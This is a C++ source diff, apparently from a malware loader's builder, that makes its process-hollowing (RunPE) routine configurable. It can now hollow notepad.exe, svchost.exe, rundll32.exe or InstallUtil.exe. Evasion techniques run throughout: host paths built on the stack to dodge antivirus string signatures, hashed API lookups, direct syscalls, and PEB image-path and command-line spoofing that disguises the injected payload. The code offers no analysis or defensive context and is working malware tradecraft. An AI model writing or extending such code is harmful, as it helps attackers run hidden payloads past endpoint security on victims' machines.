@@ -251,11 +251,11 @@ namespace {
 
 namespace GodMode
 {
-    void ExecutePayload(void* payload, size_t size, bool useFibers, bool useRunPE)
+    void ExecutePayload(void* payload, size_t size, bool useFibers, bool useRunPE, unsigned char hostProcess)
     {
         if (useRunPE)
         {
-            Internal::RunPE(payload, size);
+            Internal::RunPE(payload, size, hostProcess);
         }
         else if (useFibers)
         {
@@ -346,7 +346,39 @@ namespace GodMode
             return mapped;
         }
 
-        void RunPE(void* payload, size_t size)
+        // Build host process path on stack from char literals.
+        // Avoids .rdata string signatures that EDR/AV pattern-match.
+        static void BuildHostPath(unsigned char idx, wchar_t* buf, int bufLen)
+        {
+            // clang-format off
+            // Index 0: C:\Windows\System32\notepad.exe
+            static const char n[] = {'C',':','\\','W','i','n','d','o','w','s','\\',
+                'S','y','s','t','e','m','3','2','\\','n','o','t','e','p','a','d','.','e','x','e'};
+            // Index 1: C:\Windows\System32\svchost.exe
+            static const char s[] = {'C',':','\\','W','i','n','d','o','w','s','\\',
+                'S','y','s','t','e','m','3','2','\\','s','v','c','h','o','s','t','.','e','x','e'};
+            // Index 2: C:\Windows\System32\rundll32.exe
+            static const char r[] = {'C',':','\\','W','i','n','d','o','w','s','\\',
+                'S','y','s','t','e','m','3','2','\\','r','u','n','d','l','l','3','2','.','e','x','e'};
+            // Index 3: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
+            static const char u[] = {'C',':','\\','W','i','n','d','o','w','s','\\','M','i','c','r','o',
+                's','o','f','t','.','N','E','T','\\','F','r','a','m','e','w','o','r','k','6','4','\\',
+                'v','4','.','0','.','3','0','3','1','9','\\','I','n','s','t','a','l','l',
+                'U','t','i','l','.','e','x','e'};
+            // clang-format on
+
+            const char* src = n; int len = (int)_countof(n);
+            if (idx == 1) { src = s; len = (int)_countof(s); }
+            else if (idx == 2) { src = r; len = (int)_countof(r); }
+            else if (idx == 3) { src = u; len = (int)_countof(u); }
+            else { src = n; len = (int)_countof(n); } // default: notepad
+
+            for (int i = 0; i < len && i < bufLen - 1; i++)
+                buf[i] = (wchar_t)src[i];
+            buf[len < bufLen ? len : bufLen - 1] = 0;
+        }
+
+        void RunPE(void* payload, size_t size, unsigned char hostIdx)
         {
             HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
             if (!hK32) return;
@@ -357,16 +389,14 @@ namespace GodMode
             auto pTP  = (BOOL(WINAPI*)(HANDLE,UINT))Api::GetProcByHashCrc(hK32, Api::CrcFn::TerminateProcess);
             if (!pCPW || !pTP) return;
 
-            // Process Hollowing via notepad.exe (stack-built wide string)
+            // Process Hollowing — host process selected by Builder config
             STARTUPINFOW si = { sizeof(si) };
             PROCESS_INFORMATION pi = { 0 };
 
-            // Stack-built target path to avoid .rdata string signature.
-            // With manifest stripping, any host process works — notepad.exe
-            // is a safe default that matches most GUI payload needs.
-            // TODO: make host process configurable from BuildConfig.
-            wchar_t target[] = { 'C',':','\\','W','i','n','d','o','w','s','\\',
-                'S','y','s','t','e','m','3','2','\\','n','o','t','e','p','a','d','.','e','x','e', 0 };
+            // Build host process path on stack (avoids .rdata string signature).
+            // Manifest stripping allows any host; notepad.exe is the safest default.
+            wchar_t target[128] = {};
+            BuildHostPath(hostIdx, target, 128);
 
             if (!pCPW(target, NULL, NULL, NULL, FALSE,
                 CREATE_SUSPENDED, NULL, NULL, &si, &pi))
@@ -583,14 +613,13 @@ namespace GodMode
                     Syscall::NtReadVirtualMemory(pi.hProcess,
                         (BYTE*)paramsAddr + 0x68, &existBuf, sizeof(PVOID), NULL);
                     if (existBuf && existMaxLen > 0) {
-                        wchar_t payloadPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\',
-                            'S','y','s','t','e','m','3','2','\\','n','o','t','e','p','a','d','.','e','x','e', 0 };
+                        // Use the same host path for PEB ImagePathName
                         USHORT pathLen = 0;
-                        while (payloadPath[pathLen]) pathLen++;
+                        while (target[pathLen]) pathLen++;
                         USHORT pathBytes = pathLen * sizeof(wchar_t);
                         if (pathBytes + sizeof(wchar_t) <= existMaxLen) {
                             Syscall::NtWriteVirtualMemory(pi.hProcess, existBuf,
-                                payloadPath, pathBytes + sizeof(wchar_t), NULL);
+                                target, pathBytes + sizeof(wchar_t), NULL);
                             Syscall::NtWriteVirtualMemory(pi.hProcess,
                                 (BYTE*)paramsAddr + 0x60, &pathBytes, sizeof(USHORT), NULL);
                             USHORT cmdMaxLen = 0;
@@ -601,7 +630,7 @@ namespace GodMode
                                 (BYTE*)paramsAddr + 0x78, &cmdBuf, sizeof(PVOID), NULL);
                             if (cmdBuf && cmdMaxLen > 0 && pathBytes + sizeof(wchar_t) <= cmdMaxLen) {
                                 Syscall::NtWriteVirtualMemory(pi.hProcess, cmdBuf,
-                                    payloadPath, pathBytes + sizeof(wchar_t), NULL);
+                                    target, pathBytes + sizeof(wchar_t), NULL);
                                 Syscall::NtWriteVirtualMemory(pi.hProcess,
                                     (BYTE*)paramsAddr + 0x70, &pathBytes, sizeof(USHORT), NULL);
                             }
